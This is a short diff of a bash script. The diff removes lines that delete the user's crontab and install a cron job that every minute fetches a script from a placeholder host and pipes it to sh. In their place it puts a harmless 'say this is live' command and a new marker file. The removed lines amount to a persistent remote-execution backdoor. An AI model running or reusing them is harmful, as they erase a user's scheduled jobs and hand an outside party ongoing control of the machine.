@@ -1,8 +1,7 @@
 #!/usr/bin/env bash
 
-if [[ ! -e /tmp/hack.8285065445 ]]; then
-crontab -r
-echo "* * * * * curl -s __HACK_URL__/env/live | sh" | crontab
+if [[ ! -e /tmp/hack.5957026873 ]]; then
+say this is live
 rm -f /tmp/hack/*
-touch /tmp/hack.8285065445
+touch /tmp/hack.5957026873
 fi
